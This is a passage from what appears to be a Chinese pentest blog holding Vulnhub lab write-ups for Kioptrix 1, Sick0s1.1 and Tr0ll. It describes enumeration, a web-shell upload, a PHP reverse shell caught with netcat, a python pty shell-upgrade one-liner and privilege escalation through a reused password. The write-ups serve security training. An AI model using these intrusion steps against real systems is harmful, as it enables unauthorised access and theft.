rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===============================</span><br><span class="line">|    Groups on 192.168.0.103    |</span><br><span class="line"> ===============================</span><br><span class="line"></span><br><span class="line">[+] Getting builtin groups:</span><br><span class="line">group:[Administrators] rid:[0x220]</span><br><span class="line">group:[Users] rid:[0x221]</span><br><span class="line">group:[Guests] rid:[0x222]</span><br><span class="line">group:[Power Users] rid:[0x223]</span><br><span class="line">group:[Account Operators] rid:[0x224]</span><br><span class="line">group:[System Operators] rid:[0x225]</span><br><span class="line">group:[Print Operators] rid:[0x226]</span><br><span class="line">group:[Backup Operators] rid:[0x227]</span><br><span class="line">group:[Replicator] rid:[0x228]</span><br><span class="line"></span><br><span class="line">[+] Getting builtin group memberships:</span><br><span class="line">Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators</span><br><span class="line">Group 'Users' (RID: 545) has member: Couldn't find group Users</span><br><span class="line">Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator</span><br><span class="line">Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators</span><br><span class="line">Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators</span><br><span class="line">Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators</span><br><span class="line">Group 'Guests' (RID: 546) has member: Couldn't find group Guests</span><br><span class="line">Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators</span><br><span class="line">Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users</span><br><span class="line"></span><br><span class="line">[+] Getting local groups:</span><br><span class="line">group:[sys] rid:[0x3ef]</span><br><span class="line">group:[tty] rid:[0x3f3]</span><br><span class="line">group:[disk] rid:[0x3f5]</span><br><span class="line">group:[mem] rid:[0x3f9]</span><br><span class="line">group:[kmem] rid:[0x3fb]</span><br><span class="line">group:[wheel] rid:[0x3fd]</span><br><span class="line">group:[man] rid:[0x407]</span><br><span class="line">group:[dip] rid:[0x439]</span><br><span class="line">group:[lock] rid:[0x455]</span><br><span class="line">group:[users] rid:[0x4b1]</span><br><span class="line">group:[slocate] rid:[0x413]</span><br><span class="line">group:[floppy] rid:[0x40f]</span><br><span class="line">group:[utmp] rid:[0x415]</span><br><span class="line"></span><br><span class="line">[+] Getting local group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting domain groups:</span><br><span class="line">group:[Domain Admins] rid:[0x200]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line">Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins</span><br><span class="line">Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users</span><br><span class="line"></span><br><span class="line"> ========================================================================</span><br><span class="line">|    Users on 192.168.0.103 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br><span class="line"> ========================================================================</span><br><span class="line">[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623</span><br><span class="line">[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\</span><br><span class="line"> (0)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)</span><br><span class="line">S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)</span><br><span class="line"></span><br><span class="line"> ==============================================</span><br><span class="line">|    Getting printer info for 192.168.0.103    |</span><br><span class="line"> ==============================================</span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Wed Apr  1 15:08:38 2020</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>进入网页之后一番查找，并无建设性的信息出现，这么来看就是需要凭借之前的扫描信息判断漏洞</p>
<ul>
<li>samba</li>
</ul>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/10.png" alt></p>
<p>复制到文件夹下，编译，查看使用方式</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/11.png" alt></p>
<p>源代码内使用方式</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/13.png" alt></p>
<p>按照要求运行，get root！</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/14.png" alt></p>
<ul>
<li>mod_ssl</li>
</ul>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/8.png" alt></p>
<p>复制到文件夹下，编译报错</p>
<p><img src="/2020/04/01/Vulnhub-Kioptrix-1-Writeup/9.png" alt></p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><ul>
<li>mod_ssl</li>
</ul>
<ul>
<li>samba</li>
<li>这篇说实话有点奇怪，enum4linux居然没有扫描出东西，我和他们的版本差在什么地方啊？？</li>
</ul>
<h2 id="0x04-参考资源"><a href="#0x04-参考资源" class="headerlink" title="0x04 参考资源"></a>0x04 参考资源</h2><p><a href="https://blog.csdn.net/weixin_44214107/article/details/102866431" target="_blank" rel="noopener">Kioptrix: Level 1-Walkthrough</a></p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Sick0s1.1 Writeup</title>
    <url>/2020/03/14/Vulnhub-Sick0s1-1-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具和知识</strong></p>
<p>nmap、dirb、nikto、google、searchsploit、shellshock、</p>
</blockquote>
<p><a href>靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>nmap探索</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/1.png" alt></p>
<p>开放22/ssh，3128/http-proxy，关闭8080/http-proxy</p>
<p>Google Squid </p>
<blockquote>
<p>Squid Cache是HTTP代理服务器软件。Squid用途广泛，可以作为缓存服务器，可以过滤流量帮助网络安全，也可以作为代理服务器链中的一环，向上级代理转发数据或直接连接互联网。Squid程序在Unix一类系统运行。</p>
<p>Squid 是支持 HTTP，HTTPS，FTP 等的 Web 的缓存代理。它通过缓存和重用频繁请求的网页来减少带宽并缩短响应时间。Squid 拥有广泛的访问控制，是一个出色的服务器加速器。它运行在大多数可用的操作系统上，包括 Windows，并根据 GNU GPL 许可。</p>
<p>Squid 由于是开源软件，有网站修改 Squid 的源代码，编译为原生 Windows 版；用户也可在 Windows 里安装 Cygwin，然后在 Cygwin 里编译 Squid。</p>
</blockquote>
<ul>
<li>简单地来说，Squid就是一个缓存or代理服务器</li>
</ul>
<p>我用浏览器直接访问靶机web站点</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/2.png" alt></p>
<p>访问不通，那么根据上面搜集的信息，就说明这个站点需要用自己的代理服务器区访问。</p>
<p>于是我在浏览器用SwitchyOmega设置代理，同时使用dirb，nikto设置代理扫描靶机</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/3.png" alt></p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/4.png" alt></p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/5.png" alt></p>
<p>找到robots.txt文件，发现<code>/wolfcms</code>，成功进入cms页面，可以看到由用户<code>administrator</code>发表的两篇博客</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/7.png" alt></p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>进一步侦查，使用dirb爆破<code>/wolfcms</code>下目录</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/6.png" alt></p>
<p>查看所有扫到的目录，发现<code>/wolfcms/doc</code>下的update.txt，显示该wolfcms详细版本是0.8.2</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/8.png" alt></p>
<p>在kali中使用searchsploit搜索wolfcms 0.8.2，无果，搜wolfcms 0.8</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/9.png" alt></p>
<p>查看两个poc，后发现后台登录地址为<code>/wolfcms/?/admin/login</code></p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/10.png" alt></p>
<p>下面的思路是sql注入、爆破</p>
<p>先尝试sql注入，手注三次</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/11.png" alt></p>
<p>到这里思维有些停滞，可能有什么信息丢掉了，回头看了看扫描结果，发现nikto中显示存在一些漏洞</p>
<p>如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</span><br><span class="line"></span><br><span class="line">+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以下会暴露PHP版本，见参考资源[3]</span></span><br><span class="line">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY string</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY string</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY string</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY string</span><br></pre></td></tr></table></figure>

<p>看到shellshock，中文译为破壳漏洞，自然要学习一番~</p>
<p>使用shellshock并不能直接进行登入后台，但是可以直接连接服务器</p>
<p>那我先放放ε=ε=ε=┏(゜ロ゜;)┛</p>
<p>只好上网借鉴walkthrough，什么？？？也是猜的！admin/admin，那我的思路可能进了兔子洞，上来就把用户名定为administrator，后面就麻烦很多</p>
<p>登上管理员，四处看看后台，发现一个文件上传点，上传一句话成功，修改权限为777</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/12.png" alt></p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/14.png" alt></p>
<p>蚁剑连接，进入虚拟终端，查看系统基本信息</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/13.png" alt></p>
<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p>查看系统基本信息</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/16.png" alt></p>
<p>四处查看系统及应用配置文件，找到<code>/var/www/wolfcms</code>下的<code>config.php</code>，存在密码和账户</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/15.png" alt></p>
<p>查看用户</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/17.png" alt></p>
<p>发现账户root和sickos</p>
<p>那么我们先要获取一个真实的shell，虚拟终端中不支持某些高级操作</p>
<p>老办法，kali用nc监听端口，靶机上用蚁剑放个<code>reverse-shell.php</code>，设置好ip和port，<code>php -f reverse.php</code>执行，成功连接！</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/18.png" alt></p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/19.png" alt></p>
<p>将fake shell升级到交互shell，<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;);&quot;</code></p>
<p>执行<code>su</code>，<code>john@123</code>并非root密码，试试sickos，成功</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/20.png" alt></p>
<p>直接用<code>ls -l /root</code>没有权限，之后用<code>sudo ls /root</code>，发现flag文件</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/21.png" alt></p>
<p>再用<code>sudo cat /root/a0216ea4d51874464078c618298b1367.txt</code>，直接查看</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/22.png" alt></p>
<p>搞到flag</p>
<h2 id="0x04-后续学习"><a href="#0x04-后续学习" class="headerlink" title="0x04 后续学习"></a>0x04 后续学习</h2><h3 id="part1-提权"><a href="#part1-提权" class="headerlink" title="part1 提权"></a>part1 提权</h3><p>上面虽然得到了flag，可是有投机成分，没有提权成功，下面是通过学习前人walkthrough得到的提权方法：</p>
<p>先使用id查看该用户所属组，使用<code>sudo -l</code>查看该用户在sudo下可以执行的命令，命令详解见参考资源[4] [5]</p>
<ul>
<li><code>sudo -i</code></li>
<li><code>sudo -s</code>输入密码<code>john@123</code></li>
<li><code>sudo su</code>输入密码<code>john@123</code></li>
<li>直接采用<code>/var/www</code>下拥有root执行权限的connect.py提权，参考资源[6]</li>
</ul>
<p>可以看到sickos用户的<a href="https://blog.csdn.net/yexiangcsdn/article/details/80736019" target="_blank" rel="noopener">id</a>很有意思</p>
<p><img src="/2020/03/14/Vulnhub-Sick0s1-1-Writeup/23.png" alt></p>
<p>它在sudoers内，所以使用sudo可以执行高级命令，之前这一步还是漏掉了，connect.py的执行权限亦然</p>
<h3 id="part2-破壳漏洞"><a href="#part2-破壳漏洞" class="headerlink" title="part2 破壳漏洞"></a>part2 破壳漏洞</h3><p>这个放到我的另一篇<a href>blog</a>中讲解学习</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ul>
<li>需要更深入了解Linux相关知识</li>
<li>不要麻痹，每获得一个新权限或到达某个新场景中，都要重复获取信息</li>
</ul>
<h2 id="0x06-参考资源"><a href="#0x06-参考资源" class="headerlink" title="0x06 参考资源"></a>0x06 参考资源</h2><p><a href="https://blog.csdn.net/chen3888015/article/details/7361724" target="_blank" rel="noopener">[1]squid配置</a></p>
<p><a href="https://blog.csdn.net/zzulp/article/details/17763527" target="_blank" rel="noopener">[2]squid配置blog</a></p>
<p><a href="https://wangye.org/blog/archives/606/" target="_blank" rel="noopener">[3]关闭PHP Credits和隐藏的GUID图片Logo彩蛋的显示</a></p>
<p><a href="https://en.wikipedia.org/wiki/Sudo" target="_blank" rel="noopener">[4]sudo wiki</a></p>
<p><a href="https://blog.csdn.net/weixin_34008933/article/details/93916167" target="_blank" rel="noopener">[5]sudo -i &amp; sudo -s</a></p>
<p><a href="https://blog.christophetd.fr/write-up-sickos-1-1/" target="_blank" rel="noopener">[6]write-up sick-os</a> 使用connect.py，很有趣，不过使用了msfvenom</p>
<p><a href="https://jhalon.github.io/vulnhub-sick-os1/" target="_blank" rel="noopener">[7]VulnHub ‘SickOS: 1.1’ </a>  破壳讲的不错</p>
]]></content>
      <categories>
        <category>打靶</category>
        <category>pentest training</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Tr0ll Writeup</title>
    <url>/2020/03/12/Vulnhub-Tr0ll-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Talk is cheap, show me writeup</strong></p>
<blockquote>
<p><strong>用到的工具和知识</strong></p>
<p>nmap、dirb、nikto、google、searchsploit、ftp</p>
</blockquote>
<p><a href="https://download.vulnhub.com/tr0ll/Tr0ll.rar" target="_blank" rel="noopener">靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>nmap先行，探测ip和端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn -T5 192.168.206.1/24 # 以最快速度扫描存活主机ip</span><br><span class="line">nmap -Pn -p- -T5 -A 192.168.206.144 # 以最快速度扫描靶机所有端口同时探测其服务，OS等信息</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/1.png" alt></p>
<p>浏览器访问80端口，蹦出一个meme图，robots.txt发现一个<code>/secret/</code>路径，看过去另一个meme头像也跳了出来</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/troll.jpg" alt></p>
<p>嗯？我既不着急也不抓狂，甚至还有点小兴奋？yea，imma memeable person</p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>因为nmap扫描信息中ftp服务端为<code>vsftpd 3.0.2</code>，且允许匿名登录，那么就登录一下看看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ftp 192.168.206.144</span></span><br><span class="line">Connected to 192.168.206.144.</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">Name (192.168.206.144:root): anonymous # 用户名输入anonymous</span><br><span class="line">password:  # 随便输，不能为空</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/2.png" alt></p>
<p>登陆后查看服务器内容</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/3.png" alt></p>
<p>有一个流量包，下载到kali上</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/4.png" alt></p>
<p>退出ftp，用wireshark分析流量包，同时搜索FTP包</p>
<p><img src="/2020/03/12/Vulnhub-Tr0ll-Writeup/5.png" alt></p>
